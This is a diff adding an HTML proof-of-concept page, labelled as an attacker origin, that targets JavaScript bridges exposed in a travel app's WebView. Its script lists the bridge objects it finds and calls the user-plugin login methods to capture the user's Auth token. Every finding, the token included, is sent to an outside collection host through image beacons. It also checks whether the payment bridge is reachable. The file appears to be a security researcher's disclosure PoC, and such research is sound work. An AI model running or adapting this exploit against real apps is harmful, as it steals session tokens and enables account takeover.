@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Trip H5 Bridge PoC</title>
+<style>
+ body{font-family:monospace;background:#111;color:#0f0;font-size:13px;padding:8px;word-break:break-all}
+ .k{color:#ff0}.e{color:#f55}.ok{color:#5f5}h2{color:#0ff}
+ pre{white-space:pre-wrap}
+</style>
+</head>
+<body>
+<h2>TRIP H5 BRIDGE PoC (attacker origin)</h2>
+<div id="o"></div>
+<pre id="log"></pre>
+<script>
+var EXFIL = "https://www.hawkspawn.in/pocs/collect.gif"; // beacon (404 ok, request line is the proof)
+function log(s, cls){
+  var d=document.getElementById('log');
+  d.innerHTML += (cls?('<span class="'+cls+'">'+s+'</span>'):s) + "\n";
+}
+function beacon(tag, val){
+  try{
+    var i = new Image();
+    i.src = EXFIL + "?t=" + encodeURIComponent(tag) + "&v=" + encodeURIComponent(val) + "&_=" + Date.now();
+  }catch(e){}
+}
+
+// ---- 1. origin / context ----
+log("=== CONTEXT ===","k");
+log("location.href = " + location.href);
+try{ log("document.domain = " + document.domain); }catch(e){ log("document.domain ERR "+e,"e"); }
+beacon("origin", location.href);
+
+// ---- 2. enumerate injected bridge objects on window ----
+log("","");
+log("=== WINDOW BRIDGE ENUMERATION ===","k");
+var candidates = ["User_a","Pay_a","Util_a","Business_a","Locate_a","NavBar_a","Share_a",
+                  "Image_a","Album_a","Event_a","UBT_a","HyApp_a","HyShare_a","HyWebView_a",
+                  "Map_a","Calendar_a","Video_a","Pipe_a","FinanceUtil_a","SamSungWallet_a",
+                  "Liveness_a","CustomCamera_a"];
+var found=[];
+candidates.forEach(function(name){
+  var present = (typeof window[name] !== "undefined") && window[name] !== null;
+  if(present){ found.push(name); log("PRESENT  window."+name+"  -> "+(typeof window[name]),"ok"); }
+});
+if(found.length===0){ log("NO ctrip bridge objects exposed on this origin","e"); }
+beacon("bridges", found.join(","));
+
+// also brute-scan all window props for ctrip-ish bridges
+try{
+  var allBridges=[];
+  for(var p in window){
+    try{
+      var v=window[p];
+      if(v && typeof v==="object"){
+        // a JS bridge typically has @JavascriptInterface methods (functions)
+        var fns=[];
+        for(var m in v){ if(typeof v[m]==="function") fns.push(m); }
+        if(fns.length>0 && /_a$|Plugin|ctrip|trip/i.test(p)){
+          allBridges.push(p+"["+fns.slice(0,6).join(",")+"]");
+        }
+      }
+    }catch(e){}
+  }
+  if(allBridges.length){ log("","");log("SCAN HITS: "+allBridges.join(" | "),"ok"); beacon("scan", allBridges.join(" | ")); }
+}catch(e){}
+
+// ---- 3. callback receiver for bridge async responses ----
+// ctrip bridges call window.app.callback(tagName, json) or invoke the callbackTagName as a global fn.
+window.__hits = {};
+function makeCb(tag){
+  window[tag] = function(resp){
+    log("","");
+    log(">>> CALLBACK "+tag+" FIRED <<<","ok");
+    var s;
+    try{ s = (typeof resp==="string")? resp : JSON.stringify(resp); }catch(e){ s=String(resp); }
+    log(s,"ok");
+    window.__hits[tag]=s;
+    beacon("CB_"+tag, s);
+    // pull Auth specifically
+    try{
+      var o = (typeof resp==="string")? JSON.parse(resp): resp;
+      var data = o && (o.data||o);
+      if(data && data.Auth){ log("","");log("!!! AUTH TOKEN LEAKED: "+data.Auth,"ok"); beacon("AUTH", data.Auth); }
+    }catch(e){}
+  };
+}
+// ctrip H5 also routes callbacks via window.app.callback / app.callbackToH5
+window.app = window.app || {};
+window.app.callback = function(tag,data){ log("app.callback("+tag+") -> "+JSON.stringify(data),"ok"); beacon("appcb", tag+"="+JSON.stringify(data)); try{ if(data&&data.data&&data.data.Auth) beacon("AUTH", data.data.Auth);}catch(e){} };
+
+// ---- 4. invoke H5UserPlugin (User_a) to fetch Auth token ----
+function tryCall(objName, method, argObj){
+  try{
+    if(typeof window[objName]==="undefined" || !window[objName]){ log("skip "+objName+"."+method+" (obj absent)","e"); return; }
+    if(typeof window[objName][method]!=="function"){ log("skip "+objName+"."+method+" (not a fn)","e"); return; }
+    var arg = JSON.stringify(argObj);
+    log("CALL "+objName+"."+method+"("+arg+")","k");
+    window[objName][method](arg);
+  }catch(e){ log("ERR "+objName+"."+method+": "+e,"e"); }
+}
+
+setTimeout(function(){
+  log("","");
+  log("=== INVOKING PRIVILEGED JS APIs (User_a) ===","k");
+  makeCb("cbAutoLogin"); makeCb("cbMemberInfo"); makeCb("cbInit");
+  // memberAutoLogin returns getUserInfo() -> contains Auth
+  tryCall("User_a","memberAutoLogin",{tagName:"cbAutoLogin",callback:"cbAutoLogin"});
+  tryCall("User_a","initMemberH5Info",{tagName:"cbInit",callback:"cbInit"});
+  // also probe Pay plugin presence ONLY (do not invoke payment)
+  if(window["Pay_a"]){ log("Pay_a PRESENT (payment bridge reachable) - NOT invoking","ok"); beacon("PAY","Pay_a_present"); }
+}, 1500);
+
+setTimeout(function(){
+  log("","");
+  log("=== SUMMARY ===","k");
+  log("callbacks captured: "+Object.keys(window.__hits).join(",") , Object.keys(window.__hits).length?"ok":"e");
+}, 5000);
+</script>
+</body>
+</html>
